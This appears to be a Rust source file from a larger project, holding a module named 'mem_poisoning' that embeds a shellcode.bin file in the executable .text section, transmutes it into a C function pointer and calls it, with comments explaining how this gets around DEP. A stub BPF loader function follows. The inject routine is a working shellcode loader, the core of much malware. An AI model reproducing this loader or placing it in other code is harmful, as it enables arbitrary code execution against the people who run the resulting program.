





use crate::*;


pub mod mem_poisoning{

    use super::*;

    pub const SHELLCODE_BYTES: &[u8] = include_bytes!("shellcode.bin"); //-- includes a file as a reference to a byte array of a binary file in form &[u8]
    pub const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
    //// DEP (Data Execution Prevention) prevents code from being run from data pages such as the default heap, stacks, and memory pools, 
    ///      if an application attempts to run code from a data page that is protected, a memory access violation exception occurs, 
    //       and if the exception is not handled, the calling process is terminated.
    //// shellcodes might be in non executable section inside the memory 
    //// dereferencing requires known size thus we must dereference the loaded shellcode int [u8; SHELLCODE_LENGTH]
    //// we must dereference the &[u8] shellcode to inject the buffer itself otherwise the reference of the buffer will be injected  
    #[no_mangle]
    #[link_section=".text"] //// means we're executing the shellcode inside the .text section of the memory
    pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8] since it returns &[u8]




    pub fn inject(){
        //// the equivalent of () in C is *const ()
        let exec_shellcode: extern "C" fn() -> () = unsafe{ //// the type of exec_shellcode is a C function pointer which will return nothing; since everything in rust must have a specific size thus the compiler cannot predict what memory address the () would be associated with at execution time
            mem::transmute(&SHELLCODE as *const [u8] as *const ()) //// it copies the bits from the source value into the destination value; in our case we're transmutting the shellcode [u8] buffer into a C function pointer which is () in rust so we can call it later to execute it
        };
        exec_shellcode();

    }

}






//// with BPF VM we can compile the whole node 
//// into an .elf or .so which contains the 
//// bytecode that can be executed from 
//// the linux kernel.
pub async fn loader(){

    // TODO - build macros inside the utils.rs 
    // https://blog.redsift.com/labs/writing-bpf-code-in-rust/
    // bpf loader
    // ... 

}